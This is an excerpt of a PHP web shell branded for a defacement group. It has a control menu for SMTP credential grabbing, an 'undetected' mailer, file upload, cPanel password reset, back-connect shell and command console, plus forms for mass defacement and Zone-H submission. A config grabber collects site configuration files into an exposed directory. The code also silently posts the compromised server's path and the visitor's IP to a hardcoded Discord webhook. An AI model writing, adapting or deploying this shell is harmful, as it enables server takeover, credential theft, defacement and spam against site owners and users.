...
<div class='container-fluid'>
	<div class='py-3' id='main'>
		<div class='box shadow bg-dark p-4 rounded-3'>
			...
			<img src=https://i.ibb.co/FY0hLch/HCAPPPP-copy.png width=80px height=80px></img>
...
<div class='text-center'>
	...
	<div class='text-center'>
	<div class='btn-group'>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=adminer'>ADMINER</a>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=smtp'>GRAB SMTP</a>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=mailer'>MAILER UNDETECTED</a>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=uploader'>PHP UPLOADER</a>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&do=resetcpanelpw'>CPANEL RESET</a>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?dir=$dir&backconnect=tool'>BACK CONNECT</a>
	<a style=margin:3px; class='btn btn-outline-light btn-sm' href='?cmd&path=$path'></i>CONSOLE</a>
	</div>
</div>";
// tools nya
if(isset($_GET['path'])) {
...
$alert = "$path IP : [ " . $_SERVER['REMOTE_ADDR']."http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']. " ]";$url = "https://discord.com/api/webhooks/1034736453869129788/3pXt73RFogo_5gp9Z4lLvrAvAUlrjcDpJOstdqYj0fdSzOBu2yrzuo3USWqdAPlaaJOQ";$curl = curl_init($url);curl_setopt($curl, CURLOPT_URL, $url);curl_setopt($curl, CURLOPT_POST, true);curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);$headers = array("Content-Type: application/x-www-form-urlencoded",);curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);$data = "content=$alert";curl_setopt($curl, CURLOPT_POSTFIELDS, $data);curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);$resp = curl_exec($curl);curl_close($curl);
if ($_GET['do'] == 'adminer') {
...
if ($_GET['do'] == 'mailer') {
    ...
    if (file_exists('mail.php')) {
        echo "<center><font class='btn btn-outline-light btn-sm'><a href='$full/mail.php' target='_blank'>PHP MAILER</a></font></center>";
    } else {
...
echo "<center><form method='post'>
        <u>Defacer</u>: <br>
        <input type='text' name='notiper' size='50' value='Zeki'><br>
        <u>Team</u>: <br>
        <input type='text' name='tim' size='50' value='HAXXOR CYBER ARMY'><br>
        <u>Domains</u>: <br>
...
if($_GET['do'] == 'zoneh') {
	if($_POST['submit']) {
		...
		echo "<center><form method='post'>
		<u>Defacer</u>: <br>
		<input type='text' name='nick' size='50' value='HAXXOR CYBER ARMY'><br>
		<u>Domains</u>: <br>
    ...
    if($_POST['hajar']) {
        ...
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='haxxorteam' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='haxxorteam' placeholder='pass_baru'><br>
...
");
    ...
    if($_POST){
        $passwd = $_POST['passwd'];
        mkdir("haxxor_config", 0777);
        $isi_htc = "Options all\nRequire None\nSatisfy Any";
        $htc = fopen("haxxor_config/.htaccess","w");
        fwrite($htc, $isi_htc);
                ...
                $grab_config = array(
                    ...
                    foreach($grab_config as $config => $nama_config) {
                        ...
                        if($ambil_config == '') {
                            ...
                            $file_config = fopen("haxxor_config/$user_chonx-$nama_config.txt","w");
                            fputs($file_config,$ambil_config);
                        }
                    }
                }       
            }
            echo "<center><a href='?dir=$dir/haxxor_config'><font color=lime>Done</font></a></center>";
            }else{
